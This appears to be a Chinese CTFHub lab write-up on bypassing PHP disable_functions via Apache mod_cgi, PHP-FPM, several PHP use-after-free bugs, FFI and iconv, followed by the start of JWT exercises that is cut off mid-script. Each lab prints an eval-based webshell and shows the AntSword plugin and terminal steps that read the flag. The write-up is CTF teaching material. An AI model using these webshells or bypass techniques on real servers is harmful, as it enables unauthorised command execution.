### Apache Mod CGI

> 了解 Apache Mod CGI 为什么会 Bypass disable_function

Apache Mod CGI 绕过的核心在于利用Apache的mod_cgi模块，将特定扩展名文件当作CGI脚本执行。

- mod_cgi模块与CGI脚本：mod_cgi是Apache的一个模块，允许服务器执行CGI（通用网关接口）脚本。CGI是一种标准，定义了Web服务器与外部程序交互的方式。在Apache配置中，可以设定某些特定扩展名的文件（如.cgi、.sh，甚至自定义扩展名）被mod_cgi处理，即当请求这些文件时，Apache会执行它们而不是直接返回其内容。
- 绕过disable_functions的思路：PHP的disable_functions配置只能限制PHP函数的调用。如果我们能通过Web服务器（Apache）的机制，直接执行一个系统 shell 脚本或二进制文件，那么这些PHP的限制自然就被绕过了。
- 利用条件：要成功利用此方法，通常需要满足几个条件：
  - 目标服务器是Apache。
  - mod_cgi模块已启用。
  - Apache配置中允许使用.htaccess文件（即AllowOverride选项不为None），并且我们有权限写入.htaccess文件。
  - 对网站目录有写权限，以便上传.htaccess文件和我们的CGI脚本。

- 利用链条：
  - 首先上传一个自定义的.htaccess文件，通过其中的AddHandler或SetHandler指令，指定某个扩展名（例如.ares）的文件由mod_cgi处理。
  - 然后上传一个具有该特定扩展名的Shell脚本（例如shell.ares），并确保其具有可执行权限（在某些配置下可能需要）。
  - 当我们通过Web访问这个CGI脚本时，Apache会执行它，脚本中的系统命令（例如读取flag或反弹Shell）就会执行。

简单来说，整个过程就是：利用.htaccess文件改变Apache对特定文件的处理方式，使其作为CGI脚本执行，从而绕过PHP的disable_functions限制。

进入靶机后，`view-source`查看源码。

```html
<!DOCTYPE html>
<html>
<head>
    <title>CTFHub Bypass disable_function —— Apache Mod CGI</title>
    <meta charset="UTF-8">
</head>
<body>
<h1>CTFHub Bypass disable_function —— Apache Mod CGI</h1>
<p>本环境来源于<a href="https://github.com/AntSwordProject/AntSword-Labs">AntSword-Labs</a></p>
<a href="backdoor/">GetFlag</a>&nbsp;|&nbsp;<a href="index.php?action=reset" >重置backdoor目录</a>
</body>
</html>
```

点击`GetFlag`后，靶机跳转到`/backdoor/`，显示内容如下：

```php
<?php
@eval($_REQUEST['ant']);
show_source(__FILE__);
?>
```

用`AntSword`连接靶机，在虚拟终端直接输入`ls /`会显示`ret=127`。

在`AntSword`选中靶机，右键加载插件`绕过 disable_functions`。

在插件中选择模式**`Apache_mod_cgi`**，点击开始后会弹出一个虚拟终端，这回可以访问根目录啦。

```bash
(*) 基础信息
当前路径: /var/www/html/backdoor
磁盘列表: /
系统信息: Linux challenge-541999c0f884c2ec-7d9c598c48-5m22l 6.12.48+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.48-1 (2025-09-20) x86_64
当前用户: www-data
(*) 输入 ashelp 查看本地命令
(www-data:/var/www/html/backdoor) $ ls /
bin
boot
dev
etc
flag
home
lib
lib64
media
mnt
opt
proc
readflag
root
run
sbin
srv
sys
tmp
usr
var
(www-data:/var/www/html) $ cat /readflag
#!/bin/sh
tac /flag
(www-data:/var/www/html/backdoor) $ /readflag
ctfhub{8e80c70d2fbaaa4045d83f55}
```

提交`ctfhub{8e80c70d2fbaaa4045d83f55}`即可。

------

### PHP-FPM

> 正常情况下, PHP-FPM 是不会对外开放的。在有 webshell 之后，这就变得不一样了。学习通过攻击 PHP-FPM 达到 Bypass 的目的。

PHP-FPM绕过的核心在于与PHP-FPM服务直接通信，从而绕过PHP层面的限制。其基本原理可以概括为以下几步：

- 利用条件：首先，你需要有一个Webshell，并且服务器环境是Nginx+PHP-FPM或Apache+PHP-FPM。PHP-FPM通常会监听一个端口（如9000）或一个Unix Socket文件（如/var/run/php/php7.2-fpm.sock）。
- 通信协议：PHP-FPM采用FastCGI协议进行通信。通过向PHP-FPM监听的目标发送精心构造的FastCGI协议数据包，我们可以直接与其交互。
- 执行任意PHP代码：在FastCGI协议中，可以通过设置某些参数（如PHP_VALUE和PHP_ADMIN_VALUE）来动态修改PHP配置。攻击者可以借此开启auto_prepend_file等选项，或者直接传递PHP代码让其执行，从而突破disable_functions的限制。

靶机的源码如下：

```php+HTML
<!DOCTYPE html>
<html>
<head>
    <title>CTFHub Bypass disable_function —— 攻击PHP-FPM</title>
</head>
<body>
<h1>CTFHub Bypass disable_function —— 攻击PHP-FPM</h1>
<p>本环境来源于<a href="https://github.com/AntSwordProject/AntSword-Labs">AntSword-Labs</a></p>
</body>
</html>
<?php
@eval($_REQUEST['ant']);
show_source(__FILE__);
?>
```

用`AntSword`连接靶机，打开虚拟终端输入`ls /`的显示结果是`ret=127`，命令执行失败。

在`AntSword`选中靶机，右键加载插件`绕过 disable_functions`。

在插件中选择模式**`Fastcgi/PHP-FPM`**，FPM/FCGI 地址选择`localhost:9000`，点击开始即可。

用`AntSword`连接靶机后，刷新文件列表，看到网站根目录`/var/www/html`中多了一个`.antproxy.php`文件。

编辑数据设置，重新用`AntSword`连接靶机的`/.antproxy.php`文件，这次打开虚拟终端能执行命令啦。

```bash
(*) 基础信息
当前路径: /var/www/html
磁盘列表: /
系统信息: Linux challenge-1227efa87730f55d-6495fd8b4f-nqv82 6.12.48+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.48-1 (2025-09-20) x86_64
当前用户: www-data
(*) 输入 ashelp 查看本地命令
(www-data:/var/www/html) $ ls /
bin
boot
dev
etc
flag
home
lib
lib64
media
mnt
opt
proc
readflag
root
run
sbin
srv
sys
tmp
usr
var
(www-data:/var/www/html) $ cat /readflag
#!/bin/sh
tac /flag
(www-data:/var/www/html) $ /readflag
ctfhub{8328d44f26ab81b419858927}
```

提交`ctfhub{8328d44f26ab81b419858927}`即可。

------

### GC UAF

> 理论上PHP本地代码执行漏洞都可以用来 Bypass disable_function，比如 GC UAF

题目附件是https://bugs.php.net/bug.php?id=72530，这个漏洞是存在于 PHP 垃圾回收（GC）机制中的 “释放后使用（Use After Free）” ，主要与特定析构函数（Destructor）的交互有关，可能导致内存 corruption 或安全风险。该风险的生命周期从 2016 年报告到 2019 年修复，涉及多个 PHP 版本，且在修复后仍引发关于安全评级（如 CVE 分配）的讨论。

GC UAF的核心是 GC 在处理含特定析构函数的对象时，引用计数判断错误，导致已释放的内存被再次访问，具体流程如下：

- 构造循环引用与引用关联：通过 unserialize() 或手动代码创建特殊数据结构（如对象引用自身、数组引用对象属性），形成复杂的引用关系。
  - 示例：报告中的 ryat 类析构函数会修改自身属性引用（$this->chtg = $this->ryat），打破正常引用计数逻辑。
- 触发 GC 回收：通过 unset() 销毁变量或调用 gc_collect_cycles() 手动触发 GC，GC 会标记 “引用计数归 0” 的内存块并释放。
- 引用计数判断失效：GC 依赖 “引用计数是否变化” 判断内存是否被外部引用，但风险场景中，析构函数修改引用后，内存的引用计数未发生预期变化，导致 GC 误判 “内存已无外部引用” 并释放，而实际仍有变量（如外部引用的 `$x`）指向该内存。
- 释放后使用：后续代码访问该 “已释放但仍被引用” 的内存（如 `var_dump($out[2])`），触发 “释放后使用”，读取到无效数据（如伪造的内存内容）或导致内存 corruption。

靶机的源码如下：

```php+HTML
<!DOCTYPE html>
<html>
<head>
    <title>CTFHub Bypass disable_function —— GC UAF</title>
</head>
<body>
<h1>CTFHub Bypass disable_function —— GC UAF</h1>
<p>本环境来源于<a href="https://github.com/AntSwordProject/AntSword-Labs">AntSword-Labs</a></p>

<p>参考链接:</p>
<ul>
    <li>
        <a href="https://bugs.php.net/bug.php?id=72530" target="_blank">Bug #72530 Use after free in GC with Certain Destructors</a>
    </li>
</ul>
</body>
</html>
<?php
@eval($_REQUEST['ant']);
show_source(__FILE__);
?>
```

用`AntSword`连接靶机，打开虚拟终端输入`ls /`的显示结果是`ret=127`，命令执行失败。

在`AntSword`选中靶机，右键加载插件`绕过 disable_functions`。

在插件中选择模式**`PHP7_GC_UAF`**，点击开始后会弹出一个虚拟终端，这回可以访问根目录啦。

```bash
(*) 基础信息
当前路径: /var/www/html
磁盘列表: /
系统信息: Linux challenge-f5036ce6711e5e9c-847b445fdc-sf5r8 6.12.48+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.48-1 (2025-09-20) x86_64
当前用户: www-data
(*) 输入 ashelp 查看本地命令
(www-data:/var/www/html) $ ls /
bin
boot
dev
etc
flag
home
lib
lib64
media
mnt
opt
proc
readflag
root
run
sbin
srv
sys
tmp
usr
var
(www-data:/var/www/html) $ cat /readflag
#!/bin/sh
tac /flag
(www-data:/var/www/html) $ /readflag
ctfhub{52eafb9fd6708f10689e7728}
```

提交`ctfhub{52eafb9fd6708f10689e7728}`即可。

------

### Json Serializer UAF

> 理论上PHP本地代码执行漏洞都可以用来 Bypass disable_function, 比如 PHP #77843 Json Serializer UAF 漏洞。

题目附件是https://bugs.php.net/bug.php?id=77843。PHP Bug #77843 是 2019 年 4 月披露的、存在于 PHP 7.3.3 版本中与 JSON 序列化相关的释放后使用（Use After Free）的风险，由用户 hanno at hboeck dot de 报告，可通过构造实现JsonSerializable接口的类（如自定义X类继承DateInterval并重写jsonSerialize方法）触发，在json_encode处理含引用的数组时，因未保留对象引用导致内存被释放后仍被访问，进而产生堆内存错误；官方最初将其归类为 “Bug” 而非安全问题，最终由 nikic 分配处理并于 2019 年 4 月 23 日通过提交修复，该风险无 CVE 编号，其核心原因是json_encode在处理实现JsonSerializable接口的对象时，未正确保留对象引用：

- 当通过json_encode处理含引用的数组时，进入自定义jsonSerialize方法；
- 方法内部执行unset操作删除数组中的对象元素，导致对象内存被标记为可释放并被回收；
- 后续代码仍试图访问已释放的对象属性（如$this->y），触发堆内存读取错误（heap-use-after-free）。

靶机的源码如下：

```html
<!DOCTYPE html>
<html>
<head>
    <title>CTFHub Bypass disable_function —— Json Serializer UAF</title>
</head>
<body>
<h1>CTFHub Bypass disable_function —— Json Serializer UAF</h1>
<p>本环境来源于<a href="https://github.com/AntSwordProject/AntSword-Labs">AntSword-Labs</a></p>
</body>
</html>
<?php
@eval($_REQUEST['ant']);
show_source(__FILE__);
?>
```

用`AntSword`连接靶机，打开虚拟终端输入`ls /`的显示结果是`ret=127`，命令执行失败。

在`AntSword`选中靶机，右键加载插件`绕过 disable_functions`。

在插件中选择模式**`Json Serializer UAF`**，点击开始后会弹出一个虚拟终端，这回可以访问根目录啦。

```bash
(*) 基础信息
当前路径: /var/www/html
磁盘列表: /
系统信息: Linux challenge-f00748c2bf9b2268-5f95b85d49-ncfvq 6.12.48+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.48-1 (2025-09-20) x86_64
当前用户: www-data
(*) 输入 ashelp 查看本地命令
(www-data:/var/www/html) $ ls /
bin
boot
dev
etc
flag
home
lib
lib64
media
mnt
opt
proc
readflag
root
run
sbin
srv
sys
tmp
usr
var
(www-data:/var/www/html) $ cat /readflag
#!/bin/sh
tac /flag
(www-data:/var/www/html) $ /readflag
ctfhub{21ec82bb73ad2d24ba611440}
```

提交`ctfhub{21ec82bb73ad2d24ba611440}`即可。

------

### Backtrace UAF

> 理论上PHP本地代码执行漏洞都可以用来 Bypass disable_function

题目附件是https://bugs.php.net/bug.php?id=76047。PHP Bug #76047 是 2018 年 3 月报告、2020 年 1 月修复的释放后使用（Use-after-free）安全风险，主要影响PHP 7.0-7.4 版本，触发根源是析构函数中创建异常并捕获回溯（backtrace）时，回溯包含已销毁的函数参数引用，导致访问已释放内存；最初表现为可复现崩溃（如PDOStatement->fetchAll()或file()函数崩溃），2019 年 10 月出现公开利用工具（如php7-backtrace-bypass）用于绕过disable_functions，最终由 nikic 通过提交修复。

UAF根源是回溯（backtrace）中包含已销毁的函数参数引用，具体流程如下：

- 函数参数引用计数控制：当函数参数（如$some_string）通过函数调用赋值（如$some_string = date('Y-m-d');），其引用计数变为 2（而非直接赋值的 1）。
- 析构函数中的操作：自定义类的析构函数中，先通过unset销毁对象属性（如unset($this->a);），该属性指向的函数参数内存被标记为可释放并回收。
- 回溯捕获与无效引用：析构函数中创建Exception并调用getTrace()获取回溯，回溯会保存函数调用栈中的参数引用；由于步骤 2 中参数已销毁，回溯中保留的是 “已释放内存的无效引用”。
- 释放后使用触发：后续代码访问回溯中的无效引用，触发 “释放后使用” 错误，导致内存分配函数（如zend_mm_alloc_small）崩溃，表现为段错误（SIGSEGV）。

靶机的源码如下：

```php+HTML
<!DOCTYPE html>
<html>
<head>
    <title>CTFHub Bypass disable_function —— Backtrace UAF</title>
</head>
<body>
<h1>CTFHub Bypass disable_function —— Backtrace UAF</h1>
<p>本环境来源于<a href="https://github.com/AntSwordProject/AntSword-Labs">AntSword-Labs</a></p>
</body>
</html>
<?php
@eval($_REQUEST['ant']);
show_source(__FILE__);
?>
```

用`AntSword`连接靶机，打开虚拟终端输入`ls /`的显示结果是`ret=127`，命令执行失败。

在`AntSword`选中靶机，右键加载插件`绕过 disable_functions`。

在插件中选择模式**`PHP7 Backtrace UAF`**，点击开始后会弹出一个虚拟终端，这回可以访问根目录啦。

```bash
(*) 基础信息
当前路径: /var/www/html
磁盘列表: /
系统信息: Linux challenge-fbeab2bcaf122347-6c699967b5-4895v 6.12.48+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.48-1 (2025-09-20) x86_64
当前用户: www-data
(*) 输入 ashelp 查看本地命令
(www-data:/var/www/html) $ ls /
bin
boot
dev
etc
flag
home
lib
lib64
media
mnt
opt
proc
readflag
root
run
sbin
srv
sys
tmp
usr
var
(www-data:/var/www/html) $ cat /readflag
#!/bin/sh
tac /flag
(www-data:/var/www/html) $ /readflag
ctfhub{165de9553c72c2ed248afe32}
```

提交`ctfhub{165de9553c72c2ed248afe32}`即可。

------

### FFI 扩展

> FFI 扩展已经通过RFC, 正式成为PHP7.4的捆绑扩展库, FFI 扩展允许 PHP 执行嵌入式 C 代码。

蚁剑工具利用 PHP FFI 绕过disable_functions的原理是利用 PHP 7.4 及以上版本提供的 FFI 特性，直接调用 C 标准库中的函数来执行系统命令，从而绕过 PHP 层面的函数禁用限制。以下是详细介绍：

- FFI 特性简介：FFI（Foreign Function Interface）是 PHP 7.4 引入的关键特性，允许 PHP 代码直接调用 C 语言编写的动态链接库中的函数。允许开发者在**纯 PHP 脚本中直接调用 C 语言库**，无需编写 C 语言扩展（如传统的 mysqli、curl 扩展），极大降低了 C 库复用的门槛。通过 FFI，开发者可以在 PHP 中声明 C 函数的原型，然后直接调用这些函数，而无需编写传统的 PHP 扩展。
- 绕过原理：disable_functions是在 PHP 层面禁用了一些危险的函数，如system、exec等。但 FFI 可以绕过 PHP 的函数表，直接与操作系统的底层库进行交互。攻击者可以利用 FFI 加载 Linux 系统中的 C 标准库libc.so.6，然后直接调用其中的system函数来执行系统命令。
- 利用条件：使用 FFI 绕过disable_functions需要满足一定的条件，首先 PHP 版本必须大于等于 7.4，其次php.ini中ffi.enable必须为"true"或"preload"。

**FFI扩展与传统 C 扩展的对比**

|   对比维度   |                       传统 C 扩展方案                        |                        PHP FFI 方案                         |
| :----------: | :----------------------------------------------------------: | :---------------------------------------------------------: |
| **开发成本** | 需学习 PHP 扩展开发流程（如 Zend 引擎 API、编译配置），学习成本高 | 仅需在 PHP 中声明 C 函数原型，无需掌握 C 扩展知识，易用性高 |
|  **灵活性**  |            扩展编译后需重新编译才能更新，灵活性低            |      直接在 PHP 脚本中修改 C 函数调用逻辑，迭代效率高       |
|   **性能**   |                  编译为二进制扩展，性能略优                  | 需动态解析 C 函数原型，存在轻微性能损耗（可通过预加载优化） |
| **适用场景** |      成熟稳定的高频调用场景（如官方 curl、mysqli 扩展）      |          快速复用小众 C 库、原型验证、低频调用场景          |

靶机的源码如下：

```php+HTML
<!DOCTYPE html>
<html>
<head>
    <title>CTFHub Bypass disable_function —— FFI</title>
</head>
<body>
<h1>CTFHub Bypass disable_function —— FFI</h1>
<p>本环境来源于<a href="https://github.com/AntSwordProject/AntSword-Labs">AntSword-Labs</a></p>

<p>参考链接:</p>
<ul>
    <li>
        <a href="https://www.laruence.com/2020/03/11/5475.html" target="_blank">PHP FFI - 一种全新的PHP扩展方式</a>
    </li>
</ul>
</body>
</html>
<?php
@eval($_REQUEST['ant']);
show_source(__FILE__);
?>
```

用`AntSword`连接靶机，打开虚拟终端输入`ls /`的显示结果是`ret=127`，命令执行失败。

在`AntSword`选中靶机，右键加载插件`绕过 disable_functions`。

在插件中选择模式**`PHP74_FFI`**，点击开始后会弹出一个虚拟终端，这回可以访问根目录啦。

```bash
(*) 基础信息
当前路径: /var/www/html
磁盘列表: /
系统信息: Linux challenge-147c0a6bad5c0066-5689644567-jt57k 6.12.48+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.48-1 (2025-09-20) x86_64
当前用户: www-data
(*) 输入 ashelp 查看本地命令
(www-data:/var/www/html) $ ls /
bin
boot
dev
etc
flag
home
lib
lib64
media
mnt
opt
proc
readflag
root
run
sbin
srv
sys
tmp
usr
var
(www-data:/var/www/html) $ cat /readflag
#!/bin/sh
tac /flag
(www-data:/var/www/html) $ /readflag
ctfhub{4afe7260766fd7b414137f00}
```

提交`ctfhub{4afe7260766fd7b414137f00}`即可。

------

### iconv

`iconv`绕过`disable_functions`的技巧，主要利用了Linux系统中`iconv`函数相关的一个环境变量设计特性。下面这个表格总结了其核心攻击流程和原理：

|     步骤     |       关键组件        |                          作用与原理                          |
| :----------: | :-------------------: | :----------------------------------------------------------: |
| **设置环境** | `GCONV_PATH` 环境变量 | 通过`putenv`设置，**欺骗**`iconv`函数去加载攻击者自定义的`gconv-modules`配置文件，而非系统默认路径下的文件。 |
| **配置文件** | `gconv-modules` 文件  | 指示系统在需要进行字符集转换时，**加载**我们指定的恶意共享库（`.so`文件）。 |
|  **恶意库**  |   编译的 `.so` 文件   | 包含在库初始化时（如`gconv_init`函数中）执行的**恶意系统命令**。利用`__attribute__ ((constructor))`或`gconv_init`函数，使动态库被加载时执行代码。 |
| **触发执行** |     `iconv` 函数      | 当PHP调用`iconv`进行字符集转换时，它会遵循`GCONV_PATH`的指引，**触发**恶意动态库的加载和执行其中的代码 |

这道题可以通过利用Linux系统`iconv`函数的环境变量特性（`GCONV_PATH`），配合恶意`gconv-modules`配置文件和`.so`动态库，成功绕过`PHP`安全限制实现命令执行。使用蚁剑工具的`disable_function`插件生成反向代理木马（`.antproxy.php`），建立新会话连接后通过虚拟终端获取`flag`。

靶机的源码如下：

```php+HTML
<!DOCTYPE html>
<html>
<head>
    <title>CTFHub Bypass disable_function —— iconv</title>
</head>
<body>
<h1>CTFHub Bypass disable_function —— iconv</h1>
<p>本环境来源于<a href="https://github.com/AntSwordProject/AntSword-Labs">AntSword-Labs</a></p>
</body>
</html>
<?php
@eval($_REQUEST['ant']);
show_source(__FILE__);
?>
```

用`AntSword`连接靶机，打开虚拟终端输入`ls /`的显示结果是`ret=127`，命令执行失败。

在`AntSword`选中靶机，右键加载插件`绕过 disable_functions`。

在插件中选择模式**`iconv`**，点击开始即可。

用`AntSword`连接靶机后，刷新文件列表，看到网站根目录`/var/www/html`中多了一个`.antproxy.php`文件。

编辑数据设置，重新用`AntSword`连接靶机的`/.antproxy.php`文件，这次打开虚拟终端能执行命令啦。

```bash
(*) 基础信息
当前路径: /var/www/html
磁盘列表: /
系统信息: Linux challenge-b999490ca8af10c7-5cd48dd9ff-mp2tj 6.12.48+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.48-1 (2025-09-20) x86_64
当前用户: www-data
(*) 输入 ashelp 查看本地命令
(www-data:/var/www/html) $ ls /
bin
boot
dev
etc
flag
home
lib
lib64
media
mnt
opt
proc
readflag
root
run
sbin
srv
sys
tmp
usr
var
(www-data:/var/www/html) $ cat /readflag
#!/bin/sh
tac /flag
(www-data:/var/www/html) $ /readflag
ctfhub{5485220b518d9447b346ea83}
```

提交`ctfhub{5485220b518d9447b346ea83}`即可。

------

### bypass iconv 1

这题是利用PHP iconv扩展进行`disable_functions`绕过的攻击环境，通过`eval($_REQUEST['ant'])`获取恶意代码。攻击者借助iconv字符转换功能中的GCONV_PATH环境变量机制，通过putenv设置自定义字符集转换配置路径，诱导iconv函数加载恶意共享库(.so文件)，利用gconv-modules配置文件指向包含系统命令的恶意模块，在动态库初始化时执行任意命令，从而绕过PHP安全限制实现权限提升和Webshell持久化控制。

靶机的源码如下：

```php+HTML
<!DOCTYPE html>
<html>
<head>
    <title>CTFHub Bypass disable_function —— iconv  Bypass 1</title>
</head>
<body>
<h1>CTFHub Bypass disable_function —— iconv  Bypass 1</h1>
<p>本环境来源于<a href="https://github.com/AntSwordProject/AntSword-Labs">AntSword-Labs</a></p>
</body>
</html>
<?php
@eval($_REQUEST['ant']);
show_source(__FILE__);
?>
```

用`AntSword`连接靶机，打开虚拟终端输入`ls /`的显示结果是`ret=127`，命令执行失败。

在`AntSword`选中靶机，右键加载插件`绕过 disable_functions`。

在插件中选择模式**`iconv`**，点击开始即可。

用`AntSword`连接靶机后，刷新文件列表，看到网站根目录`/var/www/html`中多了一个`.antproxy.php`文件。

编辑数据设置，重新用`AntSword`连接靶机的`/.antproxy.php`文件，这次打开虚拟终端能执行命令啦。

```bash
(*) 基础信息
当前路径: /var/www/html
磁盘列表: /
系统信息: Linux challenge-2ff1cf898aac35ab-bb568d689-kc5th 6.12.48+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.48-1 (2025-09-20) x86_64
当前用户: www-data
(*) 输入 ashelp 查看本地命令
(www-data:/var/www/html) $ ls /
bin
boot
dev
etc
flag
home
lib
lib64
media
mnt
opt
proc
readflag
root
run
sbin
srv
sys
tmp
usr
var
(www-data:/var/www/html) $ cat /readflag
#!/bin/sh
tac /flag
(www-data:/var/www/html) $ /readflag
ctfhub{573f58bf1eb135afb2dccdb6}
```

提交`ctfhub{573f58bf1eb135afb2dccdb6}`即可。

------

### bypass iconv 2

这是一个利用PHP iconv扩展进行disable_functions绕过的进阶攻击环境，通过eval($_REQUEST['ant'])执行恶意代码。攻击者利用iconv_open()函数在处理字符集名称时的风险，通过精心构造超长或特殊的字符集参数触发缓冲区溢出或内存破坏，结合PHP垃圾回收机制实现Use-After-Free利用，在特定PHP版本中绕过安全限制执行系统命令，最终实现权限提升和Webshell持久化控制，体现了字符编码处理模块在边界检查方面的安全隐患。

靶机的源码如下：

```php+HTML
<!DOCTYPE html>
<html>
<head>
    <title>CTFHub Bypass disable_function —— iconv Bypass 2</title>
</head>
<body>
<h1>CTFHub Bypass disable_function —— iconv Bypass 2</h1>
<p>本环境来源于<a href="https://github.com/AntSwordProject/AntSword-Labs">AntSword-Labs</a></p>
</body>
</html>
<?php
@eval($_REQUEST['ant']);
show_source(__FILE__);
?>
```

用`AntSword`连接靶机，打开虚拟终端输入`ls /`的显示结果是`ret=127`，命令执行失败。

在`AntSword`选中靶机，右键加载插件`绕过 disable_functions`。

在插件中选择模式**`iconv`**，点击开始即可。

用`AntSword`连接靶机后，刷新文件列表，看到网站根目录`/var/www/html`中多了一个`.antproxy.php`文件。

编辑数据设置，重新用`AntSword`连接靶机的`/.antproxy.php`文件，这次打开虚拟终端能执行命令啦。

```bash
(*) 基础信息
当前路径: /var/www/html
磁盘列表: /
系统信息: Linux challenge-207cb61c0d37a801-85cd66f77d-rl9kw 6.12.48+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.48-1 (2025-09-20) x86_64
当前用户: www-data
(*) 输入 ashelp 查看本地命令
(www-data:/var/www/html) $ ls /
bin
boot
dev
etc
flag
home
lib
lib64
media
mnt
opt
proc
readflag
root
run
sbin
srv
sys
tmp
usr
var
(www-data:/var/www/html) $ cat /readflag
#!/bin/sh
tac /flag
(www-data:/var/www/html) $ /readflag
ctfhub{af84d50e4e4b8f1514f84637}
```

提交`ctfhub{af84d50e4e4b8f1514f84637}`即可。

------

## JSON Web Token

### 基础知识

> 学习什么是 JWT

题目附件是https://www.wolai.com/ctfhub/hcFRbVUSwDUD1UTrPJbkob，详细地讲解了JWT概念。

简单来说，JWT是JSON Web Token的缩写， JWT由Header、Payload和Signature三部分组成，其中Header和Payload这两部分的数据是以明文形式传输的，如果其中包含了敏感信息的话，就会发生敏感信息泄露。题目附件的详细内容如下：

> #### 什么是JWT
>
> Json Web Token (JWT)，是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（[RFC 7519](https://tools.ietf.org/html/rfc7519)。
>
> 该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景，是目前最流行的跨域认证解决方案。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。
>
> #### JWT 的原理
>
> JWT 的原理是，服务器认证以后，生成一个 JSON 对象，发回给用户，就像下面这样。
>
> ```json
> {
>   "姓名": "张三",
>   "角色": "管理员",
>   "到期时间": "2018年7月1日0点0分"
> }
> ```
>
> 以后，用户与服务端通信的时候，都要发回这个 JSON 对象。服务器完全只靠这个对象认定用户身份。为了防止用户篡改数据，服务器在生成这个对象的时候，会加上签名（详见后文）。
>
> 服务器就不保存任何 session 数据了，也就是说，服务器变成无状态了，从而比较容易实现扩展。
>
> #### JWT 的数据结构
>
> 实际当中 JWT 长这个样子：
>
> ```
> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkNURkh1YiIsImlhdCI6MTUxNjIzOTAyMn0.Y2PuC-D6SfCRpsPN19_1Sb4WPJNkJr7lhG6YzA8-9OQ
> ```
>
> 它是一个很长的字符串，中间用点（.）分隔成三个部分。注意，JWT 内部是没有换行的
>
> JWT 的三个部分依次如下:
>
> - Header（头部）
> - Payload（负载）
> - Signature（签名）
>
> 写成一行，就是`Header.Payload.Signature`。
>
> 每个部分最后都会使用 `base64URLEncode` 方式进行编码：
>
> ```python
> #!/usr/bin/env python
> function base64url_encode($data) {
>     return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
> } 
> ```
>
> #### Header
>
> Header 部分是一个 JSON 对象，描述 JWT 的元数据，以上述例子为例。
>
> `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9` 使用 `base64decode` 之后是：
>
> ```json
> {
>   "alg": "HS256",
>   "typ": "JWT"
> }
> ```
>
> header部分最常用的两个字段是alg和typ。
>
> alg属性表示token签名的算法(algorithm)，最常用的为HMAC和RSA算法
>
> typ属性表示这个token的类型（type），JWT 令牌统一写为JWT。
>
> #### Payload
>
> Payload 部分也是一个 JSON 对象，用来存放实际需要传递的数据。JWT 规定了7个官方字段，供选用。
>
> - iss (issuer)：签发人
> - exp (expiration time)：过期时间
> - sub (subject)：主题
> - aud (audience)：受众
> - nbf (Not Before)：生效时间
> - iat (Issued At)：签发时间
> - jti (JWT ID)：编号
>
> 除了官方字段，还能在这个部分定义私有字段，以上述例子为例。Payload部分的base64编码内容`eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkNURkh1YiIsImlhdCI6MTUxNjIzOTAyMn0`在`base64` 解码后是：
>
> ```
> {
>   "sub": "1234567890",
>   "name": "CTFHub",
>   "iat": 1516239022
> }
> ```
>
> 注意：JWT 默认是不会对 Payload 加密的，也就意味着任何人都可以读到这部分JSON的内容，所以不要将私密的信息放在这个部分。
>
> #### Signature
>
> Signature 部分是对前两部分的签名，防止数据篡改
>
> 首先，需要指定一个密钥（secret）。这个密钥只有服务器才知道，不能泄露给用户。然后，**使用 Header 里面指定的签名算法（默认是 HMAC SHA256）**，按照下面的公式产生签名。
>
> ```javascript
> HMACSHA256(
>   base64UrlEncode(header) + "." +
>   base64UrlEncode(payload),
>   secret)
> ```
>
> 算出签名以后，把 Header、Payload、Signature 三个部分拼成一个字符串，每个部分之间用"点"（.）分隔，就可以返回给用户。
>
> #### FLAG
>
> ```
> ctfhub{cfd61b8a7397fa7c10b2ae548f5bfaef}
> ```

提交`ctfhub{cfd61b8a7397fa7c10b2ae548f5bfaef}`即可。

------

### 敏感信息泄露

> JWT 的头部和有效载荷这两部分的数据是以明文形式传输的，如果其中包含了敏感信息的话，就会发生敏感信息泄露。试着找出FLAG。格式为 `flag{}`。

进入靶机后看到一个名为`Web Login`的登录框，包含账号、密码的输入框和登录按钮。

打开Chrome的`Network`抓包，随便输入测试一下。输入账号`admin`和密码`123`，居然成功登录，回显：

```
welcome admin
Where is Flag?
```

在`Response Headers`中可以看到`Set-Cookie`包含`token`信息如下：

```
token=eyJBRyI6Ijk0YzUxMTExMzZmZDMyY30iLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMiLCJGTCI6ImN0Zmh1YntkN2Q2YTdlNTAifQ.R1vt_3OMolyUUIHw-RWDxF-9R8Z_63kWxcCXrFKT_pw;
```

`token`正好是`Header.Payload.Signature`的`JWT`格式。

编写`Python`代码求解`JWT`：

```python
import json
import base64

def jwt_decode(token):
    parts = token.split('.')
    if len(parts) != 3:
        raise ValueError("Invalid JWT")
    # 补全base64 padding并进行base64解码
    def _b64decode(s):
        s += '=' * (-len(s) % 4)
        return base64.b64decode(s)
    # 用loads加载json数据
    header = json.loads(_b64decode(parts[0]))
    payload = json.loads(_b64decode(parts[1]))
    signature = parts[2]  # 签名通常不 base64 解码（用于验证）
    return header, payload, signature

token = 'eyJBRyI6Ijk0YzUxMTExMzZmZDMyY30iLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMiLCJGTCI6ImN0Zmh1YntkN2Q2YTdlNTAifQ.R1vt_3OMolyUUIHw-RWDxF-9R8Z_63kWxcCXrFKT_pw'
(h, p, s) = jwt_decode(token)
print("Header:", h)
